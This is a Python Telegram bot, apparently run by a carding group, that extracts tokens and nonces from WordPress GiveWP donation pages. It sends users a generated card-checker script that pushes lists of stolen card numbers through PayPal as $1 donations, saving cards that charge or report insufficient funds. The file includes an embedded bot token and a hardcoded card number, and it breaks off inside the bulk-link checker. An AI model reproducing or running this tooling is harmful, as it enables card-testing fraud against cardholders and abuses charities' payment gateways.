import telebot
import time
import threading
from telebot import types
import requests, random, json, string, re, base64
from telebot.types import LabeledPrice
from datetime import datetime, timedelta
import os
import html
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# === بيانات البوت ===
token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

processing_status = {}

@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior.')
        return 
    
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username

    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a> 𝑻𝒉𝒊𝒔 𝒊𝒔 𝒂 𝑷𝒂𝒚𝑷𝒂𝒍 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒃𝒐𝒕.

[<a href="https://t.me/nnunrr">ϟ</a>] PayPal Gateway >> /paypal 
[<a href="https://t.me/nnunrr">ϟ</a>] Bulk Extract >> /bulk
[<a href="https://t.me/nnunrr">ϟ</a>] Send Feedback >> Button Below

[<a href="https://t.me/nnunrr">ϟ</a>] 𝐷𝑒𝑣: @nnunrr '''
    
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    
    video_url = 'https://t.me/C0CCOCOvjk/9'
    bot.send_photo(message.chat.id, video_url, caption=IU, parse_mode='HTML', reply_markup=FRA)

# === نظام المراسلة ===
@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("Back", callback_data="start")
    Atty.add(back)
    YTT = f'''Welcome <a href='tg://user?id={user_id}'>{userr}</a> Send your message and the admin will respond.'''
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT, parse_mode='HTML', reply_markup=Atty)
    waiting_users[user_id] = True

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
    bot.send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
    bot.send_message(user_id, "Your message has been sent.", reply_markup=kb2)
    waiting_users.pop(user_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    bot.send_message(call.from_user.id, "Write your reply now:")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    bot.send_message(user_id, f"Admin response:\n\n{message.text}")
    bot.send_message(OWNER_ID, "Reply sent.")
    reply_mode.pop(message.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username
    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a>'''
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    from telebot.types import InputMediaPhoto
    photo_url = 'https://t.me/C0CCOCOvjk/9'
    bot.edit_message_media(
        media=InputMediaPhoto(media=photo_url, caption=IU, parse_mode='HTML'),
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=FRA
    )

# ============ أمر سحب PayPal ============
@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(massege.from_user.id) in blocked:
        bot.send_message(massege.chat.id, 'The admin has blocked you.')
        return

    ko = bot.send_message(massege.chat.id, "- The gate is being withdrawn ...")
    
    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko.message_id,
                text='''- Please send the link like this:

<code>/paypal https://xxxxxxx.xxx/xxxx</code>''',
                parse_mode="HTML"
            )
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko.message_id,
                text="Invalid link format ❌",
                parse_mode="HTML"
            )
            return

        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)

        if r.status_code != 200:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko.message_id,
                text=f"Site returned status: {r.status_code} ❌"
            )
            return

        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko.message_id,
            text="Gate found ✅"
        )

    except requests.exceptions.Timeout:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="The site took too long to respond ⏳")
        return
    except requests.exceptions.ConnectionError:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Connection error or site offline ❌")
        return
    except requests.exceptions.InvalidURL:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Invalid URL ❌")
        return
    except Exception as e:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{e}</code>", parse_mode="HTML")
        return

    user = generate_user_agent()
    r = requests.Session()
    headers = {'user-agent': user}
    res = r.get(url=f"{link}", headers=headers).text
    id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res).group(1)
    id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res).group(1)
    nonec = re.search(r'name="give-form-hash" value="(.*?)"', res).group(1)
    anc = re.search(r'"data-client-token":"(.*?)"', res)
    if anc:
        enc = re.search(r'"data-client-token":"(.*?)"', res).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
    else:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko.message_id,
            text='''Data Client Token not found ⚠️''',
            parse_mode="HTML"
        )
        return

    parsed = urlparse(link)
    USER_URL2 = f'https://{parsed.netloc}'
    USER_URL = parsed.path

    headers = {
        'origin': f'{USER_URL2}',
        'referer': f'{USER_URL}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'give-honeypot': '',
        'give-form-id-prefix': id_form1,
        'give-form-id': id_form2,
        'give-form-title': '',
        'give-current-url': f'{USER_URL}',
        'give-form-url': f'{USER_URL}',
        'give-form-minimum': f'1.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': nonec,
        'give-price-id': '3',
        'give-recurring-logged-in-only': '',
        'give-logged-in-only': '1',
        '_give_is_donation_recurring': '0',
        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
        'give-amount': f'1.00',
        'give_stripe_payment_method': '',
        'payment-mode': 'paypal-commerce',
        'give_first': 'Ali',
        'give_last': 'rights and',
        'give_email': 'Ali22@gmail.com',
        'card_name': 'Ali ',
        'card_exp_month': '',
        'card_exp_year': '',
        'give_action': 'purchase',
        'give-gateway': 'paypal-commerce',
        'action': 'give_process_donation',
        'give_ajax': 'true',
    }

    response = r.post(f'{USER_URL2}/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
    data = MultipartEncoder({
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2),
        'give-form-title': (None, ''),
        'give-current-url': (None, f'{USER_URL}'),
        'give-form-url': (None, f'{USER_URL}'),
        'give-form-minimum': (None, f'1.00'),
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, nonec),
        'give-price-id': (None, '3'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, f'1.00'),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, 'Ali'),
        'give_last': (None, 'rights and'),
        'give_email': (None, 'Ali22@gmail.com'),
        'card_name': (None, 'Ali '),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'give-gateway': (None, 'paypal-commerce'),
    })
    headers = {
        'content-type': data.content_type,
        'origin': f'{USER_URL2}',
        'referer': f'{USER_URL}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'action': 'give_paypal_commerce_create_order',
    }

    response = r.post(
        f'{USER_URL2}/wp-admin/admin-ajax.php',
        params=params,
        cookies=r.cookies,
        headers=headers,
        data=data
    )
    pk_live2 = (response.json()['data']['id'])
    if pk_live2:
        tok = pk_live2
    else:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko.message_id,
            text=f'''Token not In Data️''',
            parse_mode="HTML"
        )
        return
    headers = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
        'authorization': f'Bearer {au}',
        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }
    ccx = '4059986126444431|11|30|947'
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    json_data = {
        'payment_source': {
            'card': {
                'number': n,
                'expiry': f'20{yy}-{mm}',
                'security_code': cvc,
                'attributes': {
                    'verification': {
                        'method': 'SCA_WHEN_REQUIRED',
                    },
                },
            },
        },
        'application_context': {
            'vault': False,
        },
    }

    response = r.post(
        f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
        headers=headers,
        json=json_data,
    )

    data = MultipartEncoder({
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2),
        'give-form-title': (None, ''),
        'give-current-url': (None, f'{USER_URL}'),
        'give-form-url': (None, f'{USER_URL}'),
        'give-form-minimum': (None, f'1.00'),
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, nonec),
        'give-price-id': (None, '3'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, f'1.00'),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, 'Ali'),
        'give_last': (None, 'rights and'),
        'give_email': (None, 'Ali22@gmail.com'),
        'card_name': (None, 'Ali '),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'give-gateway': (None, 'paypal-commerce'),
    })
    headers = {
        'content-type': data.content_type,
        'origin': f'{USER_URL2}',
        'referer': f'{USER_URL}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'action': 'give_paypal_commerce_approve_order',
        'order': tok,
    }

    response = r.post(
        f'{USER_URL2}/wp-admin/admin-ajax.php',
        params=params,
        cookies=r.cookies,
        headers=headers,
        data=data
    )
    if 'ORDER_NOT_APPROVED' in response.text:
        aa = 'ORDER_NOT_APPROVED'
    else:
        aa = response.json()['data']['error']

    try:
        msg = aa
        if not msg:
            msg = html.escape(response.text[:100])
    except:
        msg = html.escape(response.text[:100])

    text_content = f'''import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from faker import Faker
from urllib.parse import urlparse

class PayPal:
        def __init__(self):
                self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
                self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
                url = '{link}'
                parsed = urlparse(url)
                domain = parsed.netloc
                path = parsed.path
                self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
                self.donation = "1.00"
                self.url = domain
                self.inurl = path
                self.email = f"{{random.choice(self.first_name)}}{{random.choice(self.last_name)}}{{random.randint(100,999)}}@gmail.com"
                self.r = requests.Session()
                self.uu = UserAgent()

        def Key(self):
                he1 = {{
                        'upgrade-insecure-requests': '1',
                        'user-agent': self.uu.random,
                }}
                r1 = self.r.get(f'https://{{self.url}}{{self.inurl}}', headers=he1, )
                self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
                self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
                self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
                enc = re.search(r'"data-client-token":"(.*?)"',r1.text).group(1)
                dec = base64.b64decode(enc).decode('utf-8')
                self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
                return self.au, self.id_form1, self.id_form2, self.nonec

        def Krs(self, ccx):
                ccx=ccx.strip()
                n = ccx.split("|")[0]
                mm = ccx.split("|")[1]
                yy = ccx.split("|")[2]
                cvc = ccx.split("|")[3].strip()
                if "20" in yy:
                        yy = yy.split("20")[1]
                he2 = {{
                        'user-agent': self.uu.random,
                        'x-requested-with': 'XMLHttpRequest',
                }}

                da1 = {{
                    'give-honeypot': '',
                    'give-form-id-prefix': self.id_form1,
                    'give-form-id': self.id_form2,
                    'give-form-title': 'Make a One-off Donation',
                    'give-current-url': f'https://{{self.url}}{{self.inurl}}',
                    'give-form-url': f'https://{{self.url}}{{self.inurl}}',
                    'give-form-minimum': self.donation,
                    'give-form-maximum': '50000',
                    'give-form-hash': self.nonec,
                    'give-price-id': 'custom',
                    'give-recurring-logged-in-only': '',
                    'give-logged-in-only': self.donation,
                    'give_recurring_donation_details': '{{"is_recurring":false}}',
                    'give-amount': self.donation,
                    'give_stripe_payment_method': '',
                    'payment-mode': 'paypal-commerce',
                    'give_first': random.choice(self.first_name),
                    'give_last': random.choice(self.last_name),
                    'give_email': self.email,
                    'card_name': 'msms',
                    'card_exp_month': '',
                    'card_exp_year': '',
                    'give_gift_check_is_billing_address': 'no',
                    'give_gift_aid_address_option': 'billing_address',
                    'give_gift_aid_card_first_name': '',
                    'give_gift_aid_card_last_name': '',
                    'give_gift_aid_billing_country': 'GB',
                    'give_gift_aid_card_address': '',
                    'give_gift_aid_card_address_2': '',
                    'give_gift_aid_card_city': '',
                    'give_gift_aid_card_state': '',
                    'give_gift_aid_card_zip': '',
                    'give_action': 'purchase',
                    'give-gateway': 'paypal-commerce',
                    'action': 'give_process_donation',
                    'give_ajax': 'true',
                }}

                r2 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', headers=he2, data=da1, )

                da2 = MultipartEncoder({{
                    'give-honeypot': (None, ''),
                    'give-form-id-prefix': (None, self.id_form1),
                    'give-form-id': (None, self.id_form2),
                    'give-form-title': (None, 'Make a One-off Donation'),
                    'give-current-url': (None, f'https://{{self.url}}{{self.inurl}}',),
                    'give-form-url': (None, f'https://{{self.url}}{{self.inurl}}',),
                    'give-form-minimum': (None, '1'),
                    'give-form-maximum': (None, '50000'),
                    'give-form-hash': (None, self.nonec),
                    'give-price-id': (None, 'custom'),
                    'give-recurring-logged-in-only': (None, ''),
                    'give-logged-in-only': (None, '1'),
                    'give_recurring_donation_details': (None, '{{"is_recurring":false}}'),
                    'give-amount': (None, '1'),
                    'give_stripe_payment_method': (None, ''),
                    'payment-mode': (None, 'paypal-commerce'),
                    'give_first': (None, random.choice(self.first_name)),
                    'give_last': (None, random.choice(self.last_name)),
                    'give_email': (None, self.email),
                    'card_name': (None, 'ali'),
                    'card_exp_month': (None, ''),
                    'card_exp_year': (None, ''),
                   'give_gift_check_is_billing_address': (None, 'no'),
                    'give_gift_aid_address_option': (None, 'billing_address'),
                    'give_gift_aid_card_first_name': (None, ''),
                    'give_gift_aid_card_last_name': (None, ''),
                    'give_gift_aid_billing_country': (None, 'GB'),
                    'give_gift_aid_card_address': (None, ''),
                    'give_gift_aid_card_address_2': (None, ''),
                    'give_gift_aid_card_city': (None, ''),
                    'give_gift_aid_card_state': (None, ''),
                    'give_gift_aid_card_zip': (None, ''),
                    'give-gateway': (None, 'paypal-commerce'),
                }})

                he3 = {{
                    'accept': '*/*',
                    'content-type': da2.content_type,
                    'user-agent': self.uu.random,
                }}

                pa1 = {{
                    'action': 'give_paypal_commerce_create_order',
                }}

                r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1,headers=he3,data=da2, ).json()['data']['id']


                he4 = {{
                    'authority': 'cors.api.paypal.com',
                    'accept': '*/*',
                    'authorization': f'Bearer {{self.au}}',
                    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                    'paypal-client-metadata-id': self.paypal,
                    'user-agent': self.uu.random,
                }}

                da3 = {{
                    'payment_source': {{
                        'card': {{
                            'number': n,
                            'expiry': f'20{{yy}}-{{mm}}',
                            'security_code': cvc,
                            'attributes': {{
                                'verification': {{
                                    'method': 'SCA_WHEN_REQUIRED',
                                }},
                            }},
                        }},
                    }},
                    'application_context': {{
                        'vault': False,
                    }},
                }}

                r4 = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3, )


                da4=MultipartEncoder({{
                    'give-honeypot': (None, ''),
                    'give-form-id-prefix': (None, self.id_form1),
                    'give-form-id': (None, self.id_form2),
                    'give-form-title': (None, 'Make a One-off Donation'),
                    'give-current-url': (None, f'https://{{self.url}}{{self.inurl}}'),
                    'give-form-url': (None, f'https://{{self.url}}{{self.inurl}}'),
                    'give-form-minimum': (None, '1'),
                    'give-form-maximum': (None, '50000'),
                    'give-form-hash': (None, self.nonec),
                    'give-price-id': (None, 'custom'),
                    'give-recurring-logged-in-only': (None, ''),
                    'give-logged-in-only': (None, self.donation),
                    'give_recurring_donation_details': (None, '{{"is_recurring":false}}'),
                    'give-amount': (None, self.donation),
                    'give_stripe_payment_method': (None, ''),
                    'payment-mode': (None, 'paypal-commerce'),
                    'give_first': (None, random.choice(self.first_name)),
                    'give_last': (None, random.choice(self.last_name)),
                    'give_email': (None, self.email),
                    'card_name': (None, 'ali'),
                    'card_exp_month': (None, ''),
                    'card_exp_year': (None, ''),
                    'give_gift_check_is_billing_address': (None, 'no'),
                    'give_gift_aid_address_option': (None, 'billing_address'),
                    'give_gift_aid_card_first_name': (None, ''),
                    'give_gift_aid_card_last_name': (None, ''),
                    'give_gift_aid_billing_country': (None, 'GB'),
                    'give_gift_aid_card_address': (None, ''),
                    'give_gift_aid_card_address_2': (None, ''),
                    'give_gift_aid_card_city': (None, ''),
                    'give_gift_aid_card_state': (None, ''),
                    'give_gift_aid_card_zip': (None, ''),
                    'give-gateway': (None, 'paypal-commerce'),

                }})

                he5 = {{
                    'accept': '*/*',
                    'content-type': da4.content_type,
                    'user-agent': self.uu.random,
                }}

                pa2 = {{
                    'action': 'give_paypal_commerce_approve_order',
                    'order': r3,
                }}

                r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2,headers=he5, data=da4, )

                text = r5.text
                if 'true' in text or 'sucsess' in text:
                        return 'CHARGE 1.00$'
                elif 'DO_NOT_HONOR' in text:
                        return "DO_NOT_HONOR"
                elif 'ACCOUNT_CLOSED' in text:
                        return "ACCOUNT_CLOSED"
                elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
                        return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
                elif 'LOST_OR_STOLEN' in text:
                        return "LOST_OR_STOLEN"
                elif 'CVV2_FAILURE' in text:
                        return "CVV2_FAILURE"
                elif 'SUSPECTED_FRAUD' in text:
                        return "SUSPECTED_FRAUD"
                elif 'INVALID_ACCOUNT' in text:
                        return "INVALID_ACCOUNT"
                elif 'REATTEMPT_NOT_PERMITTED' in text:
                        return "REATTEMPT_NOT_PERMITTED"
                elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
                        return "ACCOUNT_BLOCKED_BY_ISSUER"
                elif 'ORDER_NOT_APPROVED' in text:
                        return "ORDER_NOT_APPROVED"
                elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
                        return "PICKUP_CARD_SPECIAL_CONDITIONS"
                elif 'PAYER_CANNOT_PAY' in text:
                        return "PAYER_CANNOT_PAY"
                elif 'INSUFFICIENT_FUNDS' in text:
                        return "INSUFFICIENT_FUNDS"
                elif 'GENERIC_DECLINE' in text:
                        return "GENERIC_DECLINE"
                elif 'COMPLIANCE_VIOLATION' in text:
                        return "COMPLIANCE_VIOLATION"
                elif 'TRANSACTION_NOT_PERMITTED' in text:
                        return "TRANSACTION_NOT_PERMITTED"
                elif 'PAYMENT_DENIED' in text:
                        return "PAYMENT_DENIED"
                elif 'INVALID_TRANSACTION' in text:
                        return "INVALID_TRANSACTION"
                elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
                        return "RESTRICTED_OR_INACTIVE_ACCOUNT"
                elif 'SECURITY_VIOLATION' in text:
                        return "SECURITY_VIOLATION"
                elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
                        return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
                elif 'INVALID_OR_RESTRICTED_CARD' in text:
                        return "INVALID_OR_RESTRICTED_CARD"
                elif 'EXPIRED_CARD' in text:
                        return "EXPIRED_CARD"
                elif 'CRYPTOGRAPHIC_FAILURE' in text:
                        return "CRYPTOGRAPHIC_FAILURE"
                elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
                        return "TRANSACTION_CANNOT_BE_COMPLETED"
                elif 'DECLINED_PLEASE_RETRY' in text:
                        return "DECLINED_PLEASE_RETRY_LATER"
                elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
                        return "TX_ATTEMPTS_EXCEED_LIMIT"
                else:
                        try:
                                result = r5.json()['data']['error']
                                return result
                        except:
                                return "UNKNOWN_ERROR"

if __name__ == '__main__':
        Getat = 'PayPal Custom 1$'
        print(f'Cheker {{Getat}}')
        Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
        if Br == '1':
                try:
                    while True:
                        ar = input('Enter Card ( n | mm | yy | cvc ): ')
                        rr = PayPal()
                        itt = rr.Key()
                        pali = rr.Krs
                        resulti = pali(ar)
                        if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                            with open('Approved Card.txt', "a") as f:
                                f.write(ar +f': {{resulti}} > {{Getat}}')

                        print('Response: ' + resulti)
                        time.sleep(5)
                except Exception as e:
                    print('Error -', e)
        else:
                noy = 0
                cr = input('Enter Name Combo: ')
                with open(cr, "r") as f:
                        crads = f.read().splitlines()
                        print('Wait Checking Your Card ...')
                        for P in crads:
                                noy += 1
                                try:
                                        rr = PayPal()
                                        itt = rr.Key()
                                        pali = rr.Krs
                                        resulti = pali(P)
                                except Exception as e:
                                        resulti = f'Erorr {{e}}'
                                if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                                        with open('Approved Card.txt', "a") as f:
                                                f.write(P + ': {{resulti}} > {{Getat}}')
                                try:
                                        print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                                except:
                                        pass
                                time.sleep(13)'''
    file_name = f'@nnunrr_{massege.from_user.id}.py'
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(text_content)
    with open(file_name, "rb") as f:
        bot.send_document(
            chat_id=massege.chat.id,
            document=f,
            caption=f'''The gate was successfully withdrawn ✅
━━━━━━━━━━━━━━━━━━━━
<strong>Gateway information ...</strong>

[<a href="https://t.me/nnunrr">ϟ</a>] Link: <code>{link}</code>
[<a href="https://t.me/nnunrr">ϟ</a>] id form: <code>{id_form1}</code>
[<a href="https://t.me/nnunrr">ϟ</a>] id form2: <code>{id_form2}</code>
[<a href="https://t.me/nnunrr">ϟ</a>] nonce: <code>{nonec}</code>
[<a href="https://t.me/nnunrr">ϟ</a>] client token: <code>{au}</code>
[<a href="https://t.me/nnunrr">ϟ</a>] id payment: <code>{tok}</code>
[<a href="https://t.me/nnunrr">ϟ</a>] msg gateway: <code>{msg}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr''',
            parse_mode="HTML"
        )
    os.remove(file_name)

# ============ ميزة سحب من ملف مع عداد ============
@bot.message_handler(commands=['bulk'])
def bulk_extract_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return

    msg = bot.reply_to(message, "📁 Send a .txt file with links (one link per line):")
    bot.register_next_step_handler(msg, process_bulk_file)

def process_bulk_file(message):
    if not message.document:
        bot.reply_to(message, "❌ Please send a .txt file.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links = downloaded_file.decode('utf-8').splitlines()
        links = [link.strip() for link in links if link.strip()]

        if not links:
            bot.reply_to(message, "❌ File is empty.")
            return

        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        # تهيئة العداد
        processing_status[user_id] = {
            'total': total,
            'processed': 0,
            'live': 0,
            'dead': 0,
            'lock': threading.Lock()
        }
        
        status_msg = bot.reply_to(message, f"""📊 <b>جاري فحص الروابط...</b>
━━━━━━━━━━━━━━━━━━
📌 إجمالي الروابط: {total}
✅ شغالة: 0
❌ ميتة: 0
⏳ التقدم: 0%
━━━━━━━━━━━━━━━━━━
⏱️ جاري المعالجة...""", parse_mode="HTML")
        
        # دالة فحص الرابط
        def check_link(link, index):
            try:
                if not link.startswith(("http://", "https://")):
                    return None
                
                # فحص سريع
                r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=8)
                if r.status_code != 200:
                    return None
                
                res = r.text
                # البحث عن البيانات المطلوبة
                id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
                id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
                nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
                anc = re.search(r'"data-client-token":"(.*?)"', res)
                
                if not all([id_form1, id_form2, nonec, anc]):
                    return None
                
                id_form1 = id_form1.group(1)
                id_form2 = id_form2.group(1)
                nonec = nonec.group(1)
                enc = anc.group(1)
                dec = base64.b64decode(enc).decode('utf-8')
                au = re.search(r'"accessToken":"(.*?)"', dec)
                if not au:
                    return None
                au = au.group(1)
                
                parsed = urlparse(link)
                USER_URL2 = f'https://{parsed.netloc}'
                USER_URL = parsed.path
                
                # محاولة استخراج token
                headers = {
                    'origin': f'{USER_URL2}',
                    'referer': f'{USER_URL}',
                    'user-agent': 'Mozilla/5.0',
                    'x-requested-with': 'XMLHttpRequest',
                }
                
                data = MultipartEncoder({
                    'give-form-id-prefix': (None, id_form1),
                    'give-form-id': (None, id_form2),
                    'give-form-hash': (None, nonec),
                    'give-amount': (None, '1.00'),
                    'payment-mode': (None, 'paypal-commerce'),
                    'give_first': (None, 'Test'),
                    'give_last': (None, 'User'),
                    'give_email': (None, 'test@gmail.com'),
                    'give-gateway': (None, 'paypal-commerce'),
                })
                
                headers['content-type'] = data.content_type
                params = {'action': 'give_paypal_commerce_create_order'}
                
                response = requests.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, headers=headers, data=data, timeout=10)
                if response.status_code != 200:
